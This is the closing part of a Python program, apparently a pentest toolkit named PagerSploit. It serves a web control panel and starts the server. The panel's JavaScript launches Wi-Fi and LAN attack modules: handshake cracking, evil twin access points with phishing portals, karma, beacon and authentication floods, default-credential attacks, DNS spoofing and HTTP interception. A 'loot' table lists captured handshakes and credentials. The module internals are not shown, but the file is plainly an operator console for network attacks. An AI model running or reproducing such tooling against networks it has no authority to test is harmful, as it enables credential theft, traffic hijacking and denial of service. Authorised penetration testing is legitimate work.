  if (!cap_file || !wordlist) return alert('Select cap file and wordlist');
  await api('/api/wifi/crack', 'POST', {cap_file, wordlist});
}

async function loadPortalSelect() {
  const portals = await api('/api/portals');
  const sel = document.getElementById('twin-portal');
  sel.innerHTML = '<option value="">-- None --</option>' +
    portals.map(p => `<option value="${p}">${p}</option>`).join('');
}

async function doEvilTwin() {
  const ssid    = document.getElementById('twin-ssid').value;
  const channel = document.getElementById('twin-channel').value;
  const portal  = document.getElementById('twin-portal').value;
  if (!ssid) return alert('SSID required');
  await api('/api/wifi/evil_twin', 'POST', {ssid, channel, portal});
}

async function doKarma() {
  const channel = document.getElementById('karma-channel').value;
  await api('/api/wifi/karma', 'POST', {channel});
}

async function doBeaconFlood() {
  const raw = document.getElementById('beacon-ssids').value;
  const ssids = raw.split('\n').map(s => s.trim()).filter(Boolean);
  if (!ssids.length) return alert('Enter at least one SSID');
  await api('/api/wifi/beacon_flood', 'POST', {ssids});
}

async function doProbeHarvest() {
  const duration = parseInt(document.getElementById('probe-duration').value) || 60;
  await api('/api/wifi/probe_harvest', 'POST', {duration});
}

async function doAuthFlood() {
  const bssid   = document.getElementById('af-bssid').value;
  const channel = document.getElementById('af-channel').value;
  if (!bssid) return alert('BSSID required');
  await api('/api/wifi/auth_flood', 'POST', {bssid, channel});
}

async function doWpsScan() {
  document.getElementById('wps-body').innerHTML = '<tr><td colspan="6" style="color:var(--dim)">Scanning...</td></tr>';
  const r = await api('/api/wifi/wps_scan', 'POST', {});
  if (r.results) {
    document.getElementById('wps-body').innerHTML = r.results.map(w =>
      `<tr><td>${w.bssid}</td><td>${w.channel}</td><td>${w.rssi}</td><td>${w.wps_ver}</td><td>${w.locked}</td><td>${escHtml(w.ssid)}</td></tr>`
    ).join('') || '<tr><td colspan="6">None found</td></tr>';
  }
}

async function doArpScan() {
  const subnet = document.getElementById('arp-subnet') ? document.getElementById('arp-subnet').value : '172.16.52.0/24';
  document.getElementById('arp-body') && (document.getElementById('arp-body').innerHTML = '<tr><td colspan="4" style="color:var(--dim)">Scanning...</td></tr>');
  await api('/api/lan/arp_scan', 'POST', {subnet});
}

async function doPortScan() {
  const target = document.getElementById('ps-target').value;
  const ports  = document.getElementById('ps-ports').value;
  if (!target) return alert('Target required');
  document.getElementById('ps-output').textContent = 'Scanning...';
  await api('/api/lan/port_scan', 'POST', {target, ports});
  setTimeout(async () => {
    const loot = await api('/api/loot');
    const scan = loot.find(l => l.name.includes(target));
    if (scan) {
      const r = await fetch('/api/loot/download/' + encodeURIComponent(scan.name));
      const t = await r.text();
      document.getElementById('ps-output').textContent = t;
    }
  }, 15000);
}

async function doDefaultCreds() {
  const target = document.getElementById('cred-target').value;
  if (!target) return alert('Target required');
  await api('/api/lan/default_creds', 'POST', {target});
}

async function doMdns() {
  await api('/api/lan/mdns', 'POST', {});
}

async function doDnsSpoof() {
  const domain   = document.getElementById('dns-domain').value;
  const redirect = document.getElementById('dns-redirect').value;
  if (!domain || !redirect) return alert('Domain and redirect IP required');
  const r = await api('/api/lan/dns_spoof', 'POST', {domain, redirect});
  alert(r.status || r.error);
}

async function doHttpIntercept() {
  await api('/api/lan/http_intercept', 'POST', {});
}

async function stopModule(name) {
  await api('/api/stop', 'POST', {module: name});
}

async function stopAll() {
  if (!confirm('Stop all running modules?')) return;
  await api('/api/stop_all', 'POST', {});
}

async function loadLoot() {
  const loot = await api('/api/loot');
  const tbody = document.getElementById('loot-body');
  if (!loot.length) {
    tbody.innerHTML = '<tr><td colspan="5" style="color:var(--dim)">No loot yet</td></tr>';
    return;
  }
  const cats = {'handshakes':'tag-blue','credentials':'tag-red','scans':'tag-green','pmkid':'tag-yellow'};
  tbody.innerHTML = loot.map(l => `<tr>
    <td>${escHtml(l.name)}</td>
    <td><span class="tag ${cats[l.category]||'tag-blue'}">${l.category}</span></td>
    <td>${(l.size/1024).toFixed(1)}KB</td>
    <td style="color:var(--dim)">${l.modified}</td>
    <td><a href="/api/loot/download/${encodeURIComponent(l.name)}" style="color:var(--blue)">Download</a></td>
  </tr>`).join('');
}

// Poll every 2 seconds
setInterval(pollState, 2000);
pollState();
</script>
</body>
</html>'''


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument('--server-ip',   default='172.16.52.1')
    p.add_argument('--server-port', default='8080')
    p.add_argument('--payload-dir', required=True)
    return p.parse_args()


def run():
    args = parse_args()

    with STATE_LOCK:
        STATE['server_ip']   = args.server_ip
        STATE['server_port'] = args.server_port
        STATE['payload_dir'] = args.payload_dir

    log(f'PagerSploit starting on {args.server_ip}:{args.server_port}')

    stop_event = threading.Event()

    # Start web server
    server = HTTPServer((args.server_ip, int(args.server_port)), APIHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    log(f'Web UI: http://{args.server_ip}:{args.server_port}', 'success')

    # Pager display
    with Pager() as p:
        pager_display_loop(p, stop_event)

    # Shutdown
    log('Shutting down...')
    with STATE_LOCK:
        for ev in STATE['stop_events'].values():
            ev.set()
        for proc in STATE['jobs'].values():
            if hasattr(proc, 'terminate'):
                try: proc.terminate()
                except Exception: pass

    server.shutdown()


if __name__ == '__main__':
    try:
        run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f'FATAL: {e}', flush=True)
        import traceback
        traceback.print_exc()
        sys.exit(1)
